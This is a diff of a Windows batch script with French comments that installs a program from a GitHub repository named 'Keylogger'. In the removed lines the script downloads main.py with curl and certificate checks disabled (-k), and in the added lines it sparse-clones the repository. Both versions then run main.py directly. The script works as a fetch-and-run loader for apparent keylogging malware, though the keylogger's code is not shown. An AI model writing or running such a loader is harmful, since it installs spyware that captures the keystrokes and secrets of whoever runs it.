@@ -27,29 +27,33 @@ if errorlevel 1 (
     git --version
 )
 
-REM Télécharger le fichier main.py depuis un dépôt GitHub
-echo Téléchargement de main.py depuis GitHub...
-curl -k -O https://raw.githubusercontent.com/coco324/Keylogger/main/main.py
-
-REM Vérifier si le fichier main.py a été téléchargé
-if exist main.py (
-    echo main.py téléchargé avec succès !
-) else (
-    echo Échec du téléchargement de main.py. Vérifiez l'URL.
+REM Cloner le dépôt GitHub de manière sélective
+echo Clonage du dépôt GitHub de manière sélective...
+git clone --depth 1 --filter=blob:none --sparse https://github.com/coco324/Keylogger.git
+if errorlevel 1 (
+    echo Échec du clonage du dépôt GitHub. Vérifiez l'URL.
     pause
     exit /b
 )
+cd Keylogger
 
-REM Vérifier et exécuter main.py si Python est installé
-python --version >nul 2>&1
-if not errorlevel 1 (
-    echo Exécution de main.py...
-    python main.py
-    if errorlevel 1 (
-        echo Échec de l'exécution de main.py.
-    ) else (
-        echo main.py exécuté avec succès !
-    )
+REM Initialiser le clonage sélectif
+git sparse-checkout init --cone
+git sparse-checkout set main.py
+if errorlevel 1 (
+    echo Échec de la récupération de main.py dans le dépôt.
+    pause
+    exit /b
+) else (
+    echo main.py récupéré avec succès !
+)
+
+REM Exécuter le fichier main.py
+python main.py
+if errorlevel 1 (
+    echo Échec de l'exécution de main.py.
+) else (
+    echo main.py exécuté avec succès !
 )
 
 pause
